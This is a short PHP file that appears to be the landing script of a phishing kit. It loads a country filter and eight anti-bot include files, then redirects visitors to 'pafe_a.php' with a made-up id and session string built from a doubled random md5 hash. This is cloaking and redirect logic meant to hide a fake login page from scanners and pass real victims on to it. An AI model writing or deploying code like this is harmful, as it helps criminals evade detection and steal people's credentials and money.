<?php

include_once('secured/country_permit.php');;
include_once('bots/anti1.php');
include_once('bots/anti2.php');
include_once('bots/anti3.php');
include_once('bots/anti4.php');
include_once('bots/anti5.php');
include_once('bots/anti6.php');
include_once('bots/anti7.php');
include_once('bots/anti8.php');

?>
<?php

$praga=rand();
$praga=md5($praga);

header("location: pafe_a.php?id=$praga$praga&session=$praga$praga");

?>